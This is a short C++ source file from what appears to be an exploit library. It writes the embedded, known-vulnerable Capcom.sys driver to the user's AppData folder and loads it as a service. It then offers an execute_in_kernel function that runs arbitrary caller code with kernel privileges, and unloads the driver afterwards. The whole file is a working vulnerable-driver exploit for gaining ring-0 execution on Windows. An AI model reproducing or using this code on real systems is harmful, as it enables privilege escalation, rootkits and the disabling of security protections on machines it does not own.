#include "libcapcom.h"
#include "loader.h"
#include "capcomsys.h"
#include "capcom_wrapper.h"

using namespace capcom::wrapper;

capcom_wrapper* wrapper = nullptr;

bool init_exploit()
{
	std::wstring file_location = _wgetenv(L"APPDATA");
	file_location += L"\\Capcom.sys";

	bool success = loader::load_vuln_driver((uint8_t*)capcom_sys, sizeof(capcom_sys), file_location.c_str(), L"Capcom");
	if (!success) return false;

	wrapper = new capcom_wrapper;
	return success;
}

void execute_in_kernel(std::function<void(MmGetSystemRoutineAddress_t)> user_function)
{
	wrapper->execute_in_kernel(user_function);
}

bool cleanup_exploit()
{
	if (wrapper)
	{
		wrapper->close_driver_handle();
		delete wrapper;
	}

	std::wstring file_location = _wgetenv(L"APPDATA");
	file_location += L"\\Capcom.sys";
	return loader::unload_vuln_driver(file_location, L"Capcom");
}